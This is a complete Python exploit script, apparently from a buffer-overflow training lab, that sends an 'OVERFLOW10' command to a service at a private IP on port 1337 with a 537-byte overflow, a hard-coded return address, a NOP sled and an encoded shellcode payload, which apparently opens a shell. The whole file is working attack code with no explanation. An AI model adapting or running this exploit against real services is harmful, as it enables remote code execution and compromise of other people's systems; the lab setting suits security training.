#!/usr/bin/env python3

import socket

ip = "10.10.174.225"
port = 1337

prefix = "OVERFLOW10 "
offset = 537
overflow = "A" * offset
# 625011AF
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload = ("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x12\x3b\xc4\x2f\x83\xee\xfc\xe2\xf4\xee\xd3\x46\x2f\x12\x3b"
"\xa4\xa6\xf7\x0a\x04\x4b\x99\x6b\xf4\xa4\x40\x37\x4f\x7d\x06"
"\xb0\xb6\x07\x1d\x8c\x8e\x09\x23\xc4\x68\x13\x73\x47\xc6\x03"
"\x32\xfa\x0b\x22\x13\xfc\x26\xdd\x40\x6c\x4f\x7d\x02\xb0\x8e"
"\x13\x99\x77\xd5\x57\xf1\x73\xc5\xfe\x43\xb0\x9d\x0f\x13\xe8"
"\x4f\x66\x0a\xd8\xfe\x66\x99\x0f\x4f\x2e\xc4\x0a\x3b\x83\xd3"
"\xf4\xc9\x2e\xd5\x03\x24\x5a\xe4\x38\xb9\xd7\x29\x46\xe0\x5a"
"\xf6\x63\x4f\x77\x36\x3a\x17\x49\x99\x37\x8f\xa4\x4a\x27\xc5"
"\xfc\x99\x3f\x4f\x2e\xc2\xb2\x80\x0b\x36\x60\x9f\x4e\x4b\x61"
"\x95\xd0\xf2\x64\x9b\x75\x99\x29\x2f\xa2\x4f\x53\xf7\x1d\x12"
"\x3b\xac\x58\x61\x09\x9b\x7b\x7a\x77\xb3\x09\x15\xc4\x11\x97"
"\x82\x3a\xc4\x2f\x3b\xff\x90\x7f\x7a\x12\x44\x44\x12\xc4\x11"
"\x7f\x42\x6b\x94\x6f\x42\x7b\x94\x47\xf8\x34\x1b\xcf\xed\xee"
"\x53\x45\x17\x53\xce\x22\x0b\xc9\xac\x2d\x12\x2a\x98\xa6\xf4"
"\x51\xd4\x79\x45\x53\x5d\x8a\x66\x5a\x3b\xfa\x97\xfb\xb0\x23"
"\xed\x75\xcc\x5a\xfe\x53\x34\x9a\xb0\x6d\x3b\xfa\x7a\x58\xa9"
"\x4b\x12\xb2\x27\x78\x45\x6c\xf5\xd9\x78\x29\x9d\x79\xf0\xc6"
"\xa2\xe8\x56\x1f\xf8\x2e\x13\xb6\x80\x0b\x02\xfd\xc4\x6b\x46"
"\x6b\x92\x79\x44\x7d\x92\x61\x44\x6d\x97\x79\x7a\x42\x08\x10"
"\x94\xc4\x11\xa6\xf2\x75\x92\x69\xed\x0b\xac\x27\x95\x26\xa4"
"\xd0\xc7\x80\x24\x32\x38\x31\xac\x89\x87\x86\x59\xd0\xc7\x07"
"\xc2\x53\x18\xbb\x3f\xcf\x67\x3e\x7f\x68\x01\x49\xab\x45\x12"
"\x68\x3b\xfa")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")